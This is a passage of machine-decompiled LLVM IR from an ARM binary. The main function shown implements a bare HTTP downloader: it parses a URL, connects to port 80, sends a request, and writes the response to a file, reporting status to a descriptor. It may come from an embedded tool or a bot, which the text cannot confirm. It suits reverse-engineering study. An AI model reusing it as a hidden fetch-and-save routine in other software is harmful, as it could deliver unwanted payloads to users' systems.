  store i32 %arg4, i32* %stack_var_-5224, align 4
  store i32 %v2_8eb0, i32* %r1.global-to-local, align 4
  %v1_8ef8 = call i32 @function_8400(i32 %arg2)
  %v2_8f00 = icmp eq i32 %v1_8ef8, 0
  br i1 %v2_8f00, label %dec_label_pc_8f08, label %dec_label_pc_95dc

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8e94
  %v8_8f1c = icmp sgt i32 %arg3, 1
  br i1 %v8_8f1c, label %dec_label_pc_8f50, label %dec_label_pc_8f20

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8f08
  store i32 ptrtoint ([33 x i8]* @global_var_188f0.33 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8f44 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_188f0.33 to i32))
  %v1_8f4c = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_8f50

dec_label_pc_8f50:                                ; preds = %dec_label_pc_8f08, %dec_label_pc_8f20
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_8f5c = call i32 @function_10044(i32 2, i32 1, i32 0)
  %v3_8f6c = icmp eq i32 %v3_8f5c, -1
  br i1 %v3_8f6c, label %dec_label_pc_8f74, label %dec_label_pc_8fa4

dec_label_pc_8f74:                                ; preds = %dec_label_pc_8f50
  store i32 ptrtoint ([37 x i8]* @global_var_18914.35 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8f98 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_18914.35 to i32))
  %v1_8fa0 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_8fa4

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8f50, %dec_label_pc_8f74
  %v4_8fb0 = load i32, i32* %stack_var_-5224, align 4
  %v1_8fb4 = add i32 %v4_8fb0, 4
  %v1_8fb8 = inttoptr i32 %v1_8fb4 to i32*
  %v2_8fb8 = load i32, i32* %v1_8fb8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1893c.37 to i32), i32* @r1, align 4
  %v4_8fc8 = inttoptr i32 %v2_8fb8 to i8*
  %v5_8fc8 = call i32 @function_f7dc(i8* %v4_8fc8, i32 ptrtoint ([8 x i8]* @global_var_1893c.37 to i32), i32 7)
  %v2_8fd0 = icmp eq i32 %v5_8fc8, 0
  br i1 %v2_8fd0, label %dec_label_pc_8fd8, label %dec_label_pc_9010

dec_label_pc_8fd8:                                ; preds = %dec_label_pc_8fa4
  store i32 %v2_8eb0, i32* @lr, align 4
  %v4_8fe4 = load i32, i32* %stack_var_-5224, align 4
  %v1_8fe8 = add i32 %v4_8fe4, 4
  %v1_8fec = inttoptr i32 %v1_8fe8 to i32*
  %v2_8fec = load i32, i32* %v1_8fec, align 4
  %v1_8ff0 = add i32 %v2_8fec, 7
  store i32 %v1_8ff0, i32* @r1, align 4
  %v2_9008 = bitcast i32* %stack_var_-1108 to i8*
  %v3_9008 = call i32 @function_f8ec(i8* %v2_9008, i32 %v1_8ff0)
  br label %dec_label_pc_9040

dec_label_pc_9010:                                ; preds = %dec_label_pc_8fa4
  %v4_901c = load i32, i32* %stack_var_-5224, align 4
  %v1_9020 = add i32 %v4_901c, 4
  %v1_9024 = inttoptr i32 %v1_9020 to i32*
  %v2_9024 = load i32, i32* %v1_9024, align 4
  store i32 %v2_9024, i32* @r1, align 4
  %v2_903c = bitcast i32* %stack_var_-1108 to i8*
  %v3_903c = call i32 @function_f8ec(i8* %v2_903c, i32 %v2_9024)
  br label %dec_label_pc_9040

dec_label_pc_9040:                                ; preds = %dec_label_pc_8fd8, %dec_label_pc_9010
  %v2_9064.pre-phi = ptrtoint i32* %stack_var_-1108 to i32
  br label %dec_label_pc_9058

dec_label_pc_904c:                                ; preds = %dec_label_pc_907c
  %v1_9050 = add i32 %storemerge5, 1
  br label %dec_label_pc_9058

dec_label_pc_9058:                                ; preds = %dec_label_pc_9040, %dec_label_pc_904c
  %storemerge5 = phi i32 [ 0, %dec_label_pc_9040 ], [ %v1_9050, %dec_label_pc_904c ]
  store i32 %storemerge5, i32* @r4, align 4
  store i32 %v2_9064.pre-phi, i32* @r0, align 4
  %v0_906c = call i32 @function_f670()
  %v0_9074 = load i32, i32* @r4, align 4
  %v3_9074 = icmp ult i32 %v0_9074, %v0_906c
  br i1 %v3_9074, label %dec_label_pc_907c, label %dec_label_pc_90a0

dec_label_pc_907c:                                ; preds = %dec_label_pc_9058
  store i32 %v2_8eb0, i32* %r1.global-to-local, align 4
  %v2_908c = add i32 %storemerge5, %v2_8eb0
  %v2_9090 = add i32 %v2_908c, -1084
  %v1_9094 = inttoptr i32 %v2_9090 to i8*
  %v2_9094 = load i8, i8* %v1_9094, align 1
  %v7_9098 = icmp eq i8 %v2_9094, 47
  br i1 %v7_9098, label %dec_label_pc_90a0, label %dec_label_pc_904c

dec_label_pc_90a0:                                ; preds = %dec_label_pc_9058, %dec_label_pc_907c
  %v2_90b0 = add i32 %v2_8eb0, -1084
  %v2_90b4 = add i32 %v2_90b0, %storemerge5
  %v3_90bc = inttoptr i32 %v2_90b4 to i8*
  store i8 0, i8* %v3_90bc, align 1
  store i32 2, i32* %stack_var_-84, align 4
  %v1_90cc = call i32 @function_fc54(i32 80)
  store i32 %v2_9064.pre-phi, i32* @r0, align 4
  %v1_90e8 = call i32 @function_fe00(i32 %v2_9064.pre-phi)
  %v3_90f8 = icmp eq i32 %v1_90e8, -1
  br i1 %v3_90f8, label %dec_label_pc_9100, label %dec_label_pc_9184

dec_label_pc_9100:                                ; preds = %dec_label_pc_90a0
  store i32 %v2_9064.pre-phi, i32* @r0, align 4
  %v1_9110 = call i32 @function_fe28(i32 %v2_9064.pre-phi)
  %v2_9120 = icmp eq i32 %v1_9110, 0
  br i1 %v2_9120, label %dec_label_pc_9128, label %dec_label_pc_9158

dec_label_pc_9128:                                ; preds = %dec_label_pc_9100
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_18944.39 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_914c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_18944.39 to i32))
  %v1_9154 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_9158

dec_label_pc_9158:                                ; preds = %dec_label_pc_9100, %dec_label_pc_9128
  %v1_915c = add i32 %v1_9110, 16
  %v2_915c = inttoptr i32 %v1_915c to i32*
  %v3_915c = load i32, i32* %v2_915c, align 4
  %v1_9160 = inttoptr i32 %v3_915c to i32*
  %v2_9160 = load i32, i32* %v1_9160, align 4
  store i32 %v2_9160, i32* @r1, align 4
  %v1_9168 = add i32 %v1_9110, 12
  %v2_9168 = inttoptr i32 %v1_9168 to i32*
  %v3_9168 = load i32, i32* %v2_9168, align 4
  store i32 %v3_9168, i32* @r2, align 4
  %v2_9174 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_9174, i32* @r3, align 4
  store i32 %v2_9174, i32* @r0, align 4
  %v0_917c = call i32 @function_f700()
  br label %dec_label_pc_918c

dec_label_pc_9184:                                ; preds = %dec_label_pc_90a0
  store i32 %v1_90e8, i32* %stack_var_-80, align 4
  br label %dec_label_pc_918c

dec_label_pc_918c:                                ; preds = %dec_label_pc_9158, %dec_label_pc_9184
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 8, i32* @r2, align 4
  %v2_91a0 = bitcast i32* %stack_var_-76 to i8*
  %v3_91a0 = call i32 @function_f5d0(i8* %v2_91a0, i32 0)
  %v2_91a4 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_91a4, i32* %r1.global-to-local, align 4
  %v3_91b4 = call i32 @function_ff1c(i32 %v3_8f5c, i32 %v2_91a4, i32 16)
  %v2_91bc = icmp eq i32 %v3_91b4, 0
  br i1 %v2_91bc, label %dec_label_pc_91f4, label %dec_label_pc_91c4

dec_label_pc_91c4:                                ; preds = %dec_label_pc_918c
  store i32 ptrtoint ([39 x i8]* @global_var_1896c.41 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_91e8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1896c.41 to i32))
  %v1_91f0 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_918c, %dec_label_pc_91c4
  %v2_9208 = or i32 %v2_9064.pre-phi, 1
  %v1_920c = add i32 %v2_9208, %storemerge5
  store i32 %v1_920c, i32* @r2, align 4
  store i32 ptrtoint ([276 x i8]* @global_var_18994.43 to i32), i32* %r1.global-to-local, align 4
  %v3_9224 = call i32 @function_8398(i32 %v3_8f5c, i32 ptrtoint ([276 x i8]* @global_var_18994.43 to i32))
  store i32 ptrtoint ([28 x i8]* @global_var_18aa8.45 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_924c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_18aa8.45 to i32))
  %v4_925c = load i32, i32* %stack_var_-5224, align 4
  %v1_9260 = add i32 %v4_925c, 8
  %v1_9264 = inttoptr i32 %v1_9260 to i32*
  %v2_9264 = load i32, i32* %v1_9264, align 4
  store i32 %v2_9264, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18ac4.47 to i32), i32* @r1, align 4
  %v3_9270 = call i32 @function_d2bc(i32 %v2_9264, i32 ptrtoint ([3 x i8]* @global_var_18ac4.47 to i32))
  %v2_9284 = ptrtoint i32* %stack_var_-5204 to i32
  br label %dec_label_pc_927c

dec_label_pc_927c:                                ; preds = %dec_label_pc_9410, %dec_label_pc_91f4
  store i32 %v2_9284, i32* %r1.global-to-local, align 4
  %v4_9298 = call i32 @function_ff88(i32 %v3_8f5c, i32 %v2_9284, i32 4096, i32 0)
  %tmp53 = icmp slt i32 %v4_9298, 1
  br i1 %tmp53, label %dec_label_pc_9430.loopexit9, label %dec_label_pc_92b0

dec_label_pc_92b0:                                ; preds = %dec_label_pc_927c
  %v8_92c0 = icmp sgt i32 %v4_9298, 4095
  br i1 %v8_92c0, label %dec_label_pc_92f0.lr.ph, label %dec_label_pc_92c4

dec_label_pc_92c4:                                ; preds = %dec_label_pc_92b0
  store i32 %v2_8eb0, i32* @lr, align 4
  %v2_92d8 = add i32 %v4_9298, %v2_9284
  %v3_92e0 = inttoptr i32 %v2_92d8 to i8*
  store i8 0, i8* %v3_92e0, align 1
  br label %dec_label_pc_92f0.lr.ph

dec_label_pc_92f0.lr.ph:                          ; preds = %dec_label_pc_92c4, %dec_label_pc_92b0
  br label %dec_label_pc_92f0

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92f0.lr.ph, %dec_label_pc_9410
  %storemerge688 = phi i32 [ 0, %dec_label_pc_92f0.lr.ph ], [ %v1_9414, %dec_label_pc_9410 ]
  %v2_9304 = add i32 %storemerge688, %v2_9284
  store i32 ptrtoint ([5 x i8]* @global_var_18ac8.49 to i32), i32* @r1, align 4
  %v4_9314 = inttoptr i32 %v2_9304 to i8*
  %v5_9314 = call i32 @function_f7dc(i8* %v4_9314, i32 ptrtoint ([5 x i8]* @global_var_18ac8.49 to i32), i32 4)
  %v2_931c = icmp eq i32 %v5_9314, 0
  br i1 %v2_931c, label %dec_label_pc_9324, label %dec_label_pc_9410

dec_label_pc_9324:                                ; preds = %dec_label_pc_92f0
  %v1_9328 = add i32 %storemerge688, 4
  %v1_9340 = add i32 %v3_9270, 52
  %v2_9340 = inttoptr i32 %v1_9340 to i32*
  %v1_9350 = add i32 %v3_9270, 16
  %v2_9350 = inttoptr i32 %v1_9350 to i32*
  %v1_9358 = add i32 %v3_9270, 28
  %v2_9358 = inttoptr i32 %v1_9358 to i32*
  %v5_940877 = icmp slt i32 %v1_9328, %v4_9298
  br i1 %v5_940877, label %dec_label_pc_9334, label %dec_label_pc_9430

dec_label_pc_9334:                                ; preds = %dec_label_pc_9324, %dec_label_pc_93f0
  %storemerge778 = phi i32 [ %v1_93f4, %dec_label_pc_93f0 ], [ %v1_9328, %dec_label_pc_9324 ]
  %v3_9340 = load i32, i32* %v2_9340, align 4
  %v2_9344 = icmp eq i32 %v3_9340, 0
  br i1 %v2_9344, label %dec_label_pc_93c8, label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %dec_label_pc_9334
  %v3_9350 = load i32, i32* %v2_9350, align 4
  %v3_9358 = load i32, i32* %v2_9358, align 4
  %v3_935c = icmp ult i32 %v3_9350, %v3_9358
  br i1 %v3_935c, label %dec_label_pc_9364, label %dec_label_pc_939c

dec_label_pc_9364:                                ; preds = %dec_label_pc_934c
  %v3_9368 = load i32, i32* %v2_9350, align 4
  store i32 %v3_9368, i32* %r1.global-to-local, align 4
  %v2_9380 = add i32 %storemerge778, %v2_9284
  %v1_9384 = inttoptr i32 %v2_9380 to i8*
  %v2_9384 = load i8, i8* %v1_9384, align 1
  %v3_9388 = inttoptr i32 %v3_9368 to i8*
  store i8 %v2_9384, i8* %v3_9388, align 1
  %v0_938c = load i32, i32* %r1.global-to-local, align 4
  %v1_938c = add i32 %v0_938c, 1
  store i32 %v1_938c, i32* %v2_9350, align 4
  br label %dec_label_pc_93f0

dec_label_pc_939c:                                ; preds = %dec_label_pc_934c
  store i32 %v2_8eb0, i32* %r1.global-to-local, align 4
  %v2_93b0 = add i32 %storemerge778, %v2_9284
  %v1_93b4 = inttoptr i32 %v2_93b0 to i8*
  %v2_93b4 = load i8, i8* %v1_93b4, align 1
  store i32 %v3_9270, i32* %r1.global-to-local, align 4
  %v3_93c0 = call i32 @function_f3e0(i8 %v2_93b4, i32 %v3_9270)
  br label %dec_label_pc_93f0

dec_label_pc_93c8:                                ; preds = %dec_label_pc_9334
  %v2_93dc = add i32 %storemerge778, %v2_9284
  %v1_93e0 = inttoptr i32 %v2_93dc to i8*
  %v2_93e0 = load i8, i8* %v1_93e0, align 1
  %v3_93e0 = zext i8 %v2_93e0 to i32
  store i32 %v3_9270, i32* %r1.global-to-local, align 4
  %v3_93ec = call i32 @function_ee04(i32 %v3_93e0, i32 %v3_9270, i32 %storemerge778)
  br label %dec_label_pc_93f0

dec_label_pc_93f0:                                ; preds = %dec_label_pc_939c, %dec_label_pc_9364, %dec_label_pc_93c8
  %v1_93f4 = add i32 %storemerge778, 1
  %v5_9408 = icmp slt i32 %v1_93f4, %v4_9298
  br i1 %v5_9408, label %dec_label_pc_9334, label %dec_label_pc_9430

dec_label_pc_9410:                                ; preds = %dec_label_pc_92f0
  %v1_9414 = add nuw nsw i32 %storemerge688, 1
  %v5_9428 = icmp slt i32 %v1_9414, %v4_9298
  br i1 %v5_9428, label %dec_label_pc_92f0, label %dec_label_pc_927c

dec_label_pc_9430.loopexit9:                      ; preds = %dec_label_pc_927c
  %.pre = add i32 %v3_9270, 52
  %.pre17 = inttoptr i32 %.pre to i32*
  %.pre18 = add i32 %v3_9270, 16
  %.pre19 = inttoptr i32 %.pre18 to i32*
  %.pre20 = add i32 %v3_9270, 28
  %.pre21 = inttoptr i32 %.pre20 to i32*
  br label %dec_label_pc_9430

dec_label_pc_9430:                                ; preds = %dec_label_pc_9324, %dec_label_pc_93f0, %dec_label_pc_9430.loopexit9
  %v2_950c.pre-phi = phi i32* [ %.pre21, %dec_label_pc_9430.loopexit9 ], [ %v2_9358, %dec_label_pc_93f0 ], [ %v2_9358, %dec_label_pc_9324 ]
  %v2_9504.pre-phi = phi i32* [ %.pre19, %dec_label_pc_9430.loopexit9 ], [ %v2_9350, %dec_label_pc_93f0 ], [ %v2_9350, %dec_label_pc_9324 ]
  %v2_94f4.pre-phi = phi i32* [ %.pre17, %dec_label_pc_9430.loopexit9 ], [ %v2_9340, %dec_label_pc_93f0 ], [ %v2_9340, %dec_label_pc_9324 ]
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_18ad0.51 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9470 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_18ad0.51 to i32))
  br label %dec_label_pc_9474

dec_label_pc_9474:                                ; preds = %dec_label_pc_95a4, %dec_label_pc_9430
  store i32 %v2_9284, i32* %r1.global-to-local, align 4
  %v4_9490 = call i32 @function_ff88(i32 %v3_8f5c, i32 %v2_9284, i32 4096, i32 0)
  %tmp55 = icmp slt i32 %v4_9490, 1
  br i1 %tmp55, label %dec_label_pc_95c4, label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_9474
  %v8_94b8 = icmp sgt i32 %v4_9490, 4095
  br i1 %v8_94b8, label %dec_label_pc_94e8.lr.ph, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94a8
  %v2_94d0 = add i32 %v4_9490, %v2_9284
  %v3_94d8 = inttoptr i32 %v2_94d0 to i8*
  store i8 0, i8* %v3_94d8, align 1
  br label %dec_label_pc_94e8.lr.ph

dec_label_pc_94e8.lr.ph:                          ; preds = %dec_label_pc_94bc, %dec_label_pc_94a8
  br label %dec_label_pc_94e8

dec_label_pc_94e8:                                ; preds = %dec_label_pc_94e8.lr.ph, %dec_label_pc_95a4
  %storemerge868 = phi i32 [ 0, %dec_label_pc_94e8.lr.ph ], [ %v1_95a8, %dec_label_pc_95a4 ]
  %v3_94f4 = load i32, i32* %v2_94f4.pre-phi, align 4
  %v2_94f8 = icmp eq i32 %v3_94f4, 0
  br i1 %v2_94f8, label %dec_label_pc_957c, label %dec_label_pc_9500

dec_label_pc_9500:                                ; preds = %dec_label_pc_94e8
  %v3_9504 = load i32, i32* %v2_9504.pre-phi, align 4
  %v3_950c = load i32, i32* %v2_950c.pre-phi, align 4
  %v3_9510 = icmp ult i32 %v3_9504, %v3_950c
  br i1 %v3_9510, label %dec_label_pc_9518, label %dec_label_pc_9550

dec_label_pc_9518:                                ; preds = %dec_label_pc_9500
  %v3_951c = load i32, i32* %v2_9504.pre-phi, align 4
  store i32 %v3_951c, i32* %r1.global-to-local, align 4
  store i32 %v2_8eb0, i32* @lr, align 4
  %v2_9534 = add i32 %storemerge868, %v2_9284
  %v1_9538 = inttoptr i32 %v2_9534 to i8*
  %v2_9538 = load i8, i8* %v1_9538, align 1
  %v3_953c = inttoptr i32 %v3_951c to i8*
  store i8 %v2_9538, i8* %v3_953c, align 1
  %v0_9540 = load i32, i32* %r1.global-to-local, align 4
  %v1_9540 = add i32 %v0_9540, 1
  store i32 %v1_9540, i32* %v2_9504.pre-phi, align 4
  br label %dec_label_pc_95a4

dec_label_pc_9550:                                ; preds = %dec_label_pc_9500
  %v2_9564 = add i32 %storemerge868, %v2_9284
  %v1_9568 = inttoptr i32 %v2_9564 to i8*
  %v2_9568 = load i8, i8* %v1_9568, align 1
  store i32 %v3_9270, i32* %r1.global-to-local, align 4
  %v3_9574 = call i32 @function_f3e0(i8 %v2_9568, i32 %v3_9270)
  br label %dec_label_pc_95a4

dec_label_pc_957c:                                ; preds = %dec_label_pc_94e8
  store i32 %v2_8eb0, i32* %r1.global-to-local, align 4
  %v2_9590 = add i32 %storemerge868, %v2_9284
  %v1_9594 = inttoptr i32 %v2_9590 to i8*
  %v2_9594 = load i8, i8* %v1_9594, align 1
  %v3_9594 = zext i8 %v2_9594 to i32
  store i32 %v3_9270, i32* %r1.global-to-local, align 4
  %v3_95a0 = call i32 @function_ee04(i32 %v3_9594, i32 %v3_9270, i32 %storemerge868)
  br label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9550, %dec_label_pc_9518, %dec_label_pc_957c
  %v1_95a8 = add nuw nsw i32 %storemerge868, 1
  %v5_95bc = icmp slt i32 %v1_95a8, %v4_9490
  br i1 %v5_95bc, label %dec_label_pc_94e8, label %dec_label_pc_9474

dec_label_pc_95c4:                                ; preds = %dec_label_pc_9474
  %v1_95c8 = inttoptr i32 %v3_9270 to i16*
  %v2_95c8 = call i32 @function_d108(i16* %v1_95c8)
  %v1_95d0 = call i32 @function_d088(i32 %v3_8f5c)
  %v1_95d8 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_95dc

dec_label_pc_95dc:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_95c4
  %v1_95e4 = phi i32 [ %v1_8ef8, %dec_label_pc_8e94 ], [ %v1_95d8, %dec_label_pc_95c4 ]
  ret i32 %v1_95e4

; uselistorder directives
  uselistorder i32 %storemerge868, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v4_9490, { 1, 0, 2, 3 }
  uselistorder i32* %v2_9504.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_93f4, { 1, 0 }
  uselistorder i32 %storemerge778, { 1, 0, 4, 3, 2 }
  uselistorder i32 %storemerge688, { 1, 0, 2 }
  uselistorder i32 %v4_9298, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_9284, { 0, 1, 2, 3, 10, 9, 4, 5, 6, 7, 8, 12, 11 }
  uselistorder i32 %v3_9270, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %v2_91a4, { 1, 0 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_9064.pre-phi, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8eb0, { 8, 7, 9, 6, 5, 4, 10, 1, 0, 3, 11, 2, 12, 13 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ee04, { 1, 0 }
  uselistorder i32 -1084, { 0, 2, 3, 4, 1 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6, 7 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_95dc, { 1, 0 }
  uselistorder label %dec_label_pc_95a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_94e8, { 1, 0 }
  uselistorder label %dec_label_pc_9430, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9334, { 1, 0 }
  uselistorder label %dec_label_pc_92f0, { 1, 0 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_918c, { 1, 0 }
  uselistorder label %dec_label_pc_9158, { 1, 0 }
  uselistorder label %dec_label_pc_90a0, { 1, 0 }
  uselistorder label %dec_label_pc_9058, { 1, 0 }
  uselistorder label %dec_label_pc_9040, { 1, 0 }
  uselistorder label %dec_label_pc_8fa4, { 1, 0 }
  uselistorder label %dec_label_pc_8f50, { 1, 0 }
}

define i32 @function_9610(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9610:
  %tmp25 = call i8 @__decompiler_undefined_function_4()
  %tmp26 = call i8 @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  store i32 38428, i32* %stack_var_-4, align 4
  %v2_9618 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9618, i32* @fp, align 4
  %v2_9640 = load i32, i32* @global_var_23244.20, align 4
  %v7_9660 = icmp eq i32 %v2_9640, 1
  br i1 %v7_9660, label %dec_label_pc_9668, label %dec_label_pc_96c4

dec_label_pc_9668:                                ; preds = %dec_label_pc_9610
  store i32 %arg2, i32* @r2, align 4
  %v3_96bc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_18ae8.55 to i32))
  br label %dec_label_pc_9768

dec_label_pc_96c4:                                ; preds = %dec_label_pc_9610
  %v2_9634 = load i8*, i8** @global_var_23240.18, align 4
  %v3_9634 = ptrtoint i8* %v2_9634 to i32
  store i32 %v3_9634, i32* @lr, align 4
  %v3_9708 = sext i8 %tmp26 to i32
  store i32 %v3_9708, i32* @r4, align 4
  %v3_9718 = sext i8 %tmp25 to i32
  store i32 %v3_9718, i32* @r5, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9764 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_18b08.57 to i32))
  br label %dec_label_pc_9768

dec_label_pc_9768:                                ; preds = %dec_label_pc_9668, %dec_label_pc_96c4
  %storemerge = phi i32 [ %v3_9764, %dec_label_pc_96c4 ], [ %v3_96bc, %dec_label_pc_9668 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_9768, { 1, 0 }
}

define i32 @function_9784(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9784:
  %stack_var_-4 = alloca i32, align 4
  store i32 38800, i32* %stack_var_-4, align 4
  %v2_978c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_978c, i32* @fp, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_97b0 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_18b38.59 to i32))
  ret i32 %v3_97b0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_97c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_97c4:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38864, i32* %stack_var_-4, align 4
  %v2_97cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_97cc, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v7_97e8 = icmp eq i32 %arg3, 1
  br i1 %v7_97e8, label %dec_label_pc_9804, label %dec_label_pc_97f0

dec_label_pc_97f0:                                ; preds = %dec_label_pc_97c4
  store i32 %arg2, i32* @r2, align 4
  %v3_97fc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_18b58.61 to i32))
  br label %dec_label_pc_9854

dec_label_pc_9804:                                ; preds = %dec_label_pc_97c4
  %v1_9808 = add i32 %arg4, 4
  %v1_980c = inttoptr i32 %v1_9808 to i32*
  %v2_980c = load i32, i32* %v1_980c, align 4
  store i32 %v2_980c, i32* @r0, align 4
  %v0_9814 = call i32 @function_f670()
  %tmp = icmp ult i32 %v0_9814, 10
  br i1 %tmp, label %dec_label_pc_9838, label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %dec_label_pc_9804
  store i32 %arg2, i32* @r2, align 4
  %v3_9830 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_18b70.63 to i32))
  br label %dec_label_pc_9854

dec_label_pc_9838:                                ; preds = %dec_label_pc_9804
  %v3_9838 = load i32, i32* %stack_var_-32, align 4
  %v1_983c = add i32 %v3_9838, 4
  %v1_9840 = inttoptr i32 %v1_983c to i32*
  %v2_9840 = load i32, i32* %v1_9840, align 4
  store i32 %v2_9840, i32* @r2, align 4
  %v3_9850 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_18ba8.65 to i32))
  br label %dec_label_pc_9854

dec_label_pc_9854:                                ; preds = %dec_label_pc_9824, %dec_label_pc_97f0, %dec_label_pc_9838
  %v1_985c = phi i32 [ %v3_9830, %dec_label_pc_9824 ], [ %v3_97fc, %dec_label_pc_97f0 ], [ %v3_9850, %dec_label_pc_9838 ]
  ret i32 %v1_985c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9854, { 2, 0, 1 }
}

define i32 @function_986c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_986c:
  %stack_var_-4 = alloca i32, align 4
  store i32 39032, i32* %stack_var_-4, align 4
  %v2_9874 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9874, i32* @fp, align 4
  %v7_9890 = icmp eq i32 %arg3, 1
  br i1 %v7_9890, label %dec_label_pc_98e4, label %dec_label_pc_9898

dec_label_pc_9898:                                ; preds = %dec_label_pc_986c
  store i32 %arg2, i32* @r2, align 4
  %v3_98a4 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_18bb4.67 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_98dc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_18bf8.74 to i32))
  br label %dec_label_pc_997c

dec_label_pc_98e4:                                ; preds = %dec_label_pc_986c
  %v2_98e8 = load i8, i8* bitcast (i8** @global_var_2323c.8 to i8*), align 4
  %v2_98ec = icmp eq i8 %v2_98e8, 0
  br i1 %v2_98ec, label %dec_label_pc_9908, label %dec_label_pc_98f4

dec_label_pc_98f4:                                ; preds = %dec_label_pc_98e4
  store i32 %arg2, i32* @r2, align 4
  %v3_9900 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_18c1c.76 to i32))
  br label %dec_label_pc_997c

dec_label_pc_9908:                                ; preds = %dec_label_pc_98e4
  %v1_990c = add i32 %arg4, 4
  %v1_9910 = inttoptr i32 %v1_990c to i32*
  %v2_9910 = load i32, i32* %v1_9910, align 4
  store i32 %v2_9910, i32* @r0, align 4
